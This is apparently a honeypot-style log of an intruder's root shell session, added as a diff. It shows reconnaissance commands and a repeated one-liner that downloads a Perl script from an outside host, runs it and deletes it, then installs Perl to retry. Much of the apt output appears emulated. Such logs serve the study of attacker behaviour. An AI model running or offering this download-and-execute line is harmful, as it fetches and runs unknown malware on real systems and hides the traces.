@@ -1,0 +1,143 @@
+[4hAWSWeb:~# w
+[4l 19:17:34 up 175 days, 0:38,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    93.115.84.195     19:17    0.09   0.05   0.05 w
+[4hAWSWeb:~# uname -a
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:~# wget http://linux-help.bugs3.com/Camel/mail.txt;chmod +x mail.txt;perl mail.txt;rm -rf mail.txt
+[4l--2014-04-16 19:17:49--  http://linux-help.bugs3.com/Camel/mail.txt
+Connecting to linux-help.bugs3.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 33888 (33K) [text/plain]
+Saving to: `mail.txt
+
+12% [====>                                  ] 4,155        59K/s  eta 0s100%[======================================>] 33,888       59K/s
+
+2014-04-16 19:17:49 (59 KB/s) - `mail.txt' saved [33888/33888]
+[4h[4l[4hbash: perl: command not found
+[4l[4hAWSWeb:~# cat /proc/cpuinfo
+[4lprocessor	: 0
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 0
+cpu cores	: 2
+apicid		: 0
+initial apicid	: 0
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4270.03
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+processor	: 1
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 1
+cpu cores	: 2
+apicid		: 1
+initial apicid	: 1
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4266.61
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+[4hAWSWeb:~# apt-get install perl
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  perl 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 164.2kB of archives.
+After this operation, 360.8kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main perl 0.17-3 [164.2kB]
+Fetched 164.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking perl (from .../archives/perl_0.17-3_i386.deb) ...
+Processing triggers for man-db ...
+Setting up perl (0.17-3) ...
+[4hAWSWeb:~#  cat /etc/issue
+[4lDebian GNU/Linux 5.0 \n \l
+
+[4hAWSWeb:~#  apt-get install perl libwww-perl
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  libwwwperl perl 
+0 upgraded, 2 newly installed, 0 to remove and 259 not upgraded.
+Need to get 786.2kB of archives.
+After this operation, 1729.2kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main libwwwperl 1.32-4 [193.2kB]
+Get:2 http://ftp.debian.org stable/main perl 1.27-6 [593.2kB]
+Fetched 786.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking libwwwperl (from .../archives/libwwwperl_1.32-4_i386.deb) ...
+Unpacking perl (from .../archives/perl_1.27-6_i386.deb) ...
+Processing triggers for man-db ...
+Setting up libwwwperl (1.32-4) ...
+Setting up perl (1.27-6) ...
+[4hAWSWeb:~# wget http://linux-help.bugs3.com/Camel/mail.txt;chmod +x mail.txt;perl mail.txt;rm -rf mail.txt
+[4l--2014-04-16 19:20:52--  http://linux-help.bugs3.com/Camel/mail.txt
+Connecting to linux-help.bugs3.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 33888 (33K) [text/plain]
+Saving to: `mail.txt
+
+ 3% [=>                                     ] 1,235        27K/s  eta 1s100%[======================================>] 33,888       27K/s
+
+2014-04-16 19:20:52 (27 KB/s) - `mail.txt' saved [33888/33888]
+[4h[4l[4h[4lperl: Segmentation fault
+[4h[4l[4hAWSWeb:~# ps x
+[4l  PID TTY          TIME CMD
+ 5478 pts/0    00:00:00 bash
+ 5679 pts/0    00:00:00 ps x
+[4hAWSWeb:~# [Kps x[4D[Kwget http://linux-help.bugs3.com/Camel/mail.txt;chmod +x mail.txt;perl mail.txt;rm -rf mail.txt[95D[K apt-get install perl libwww-perl[33D[K cat /etc/issue[15D[Kapt-get install perl
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  perl 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 326.2kB of archives.
+After this operation, 717.2kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main perl 0.39-10 [326.2kB]
+Fetched 326.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+^C
+[4hAWSWeb:~# Unpacking perl (from .../archives/perl_0.39-10_i386.deb) ...
+Processing triggers for man-db ...
+Setting up perl (0.39-10) ...
+
+
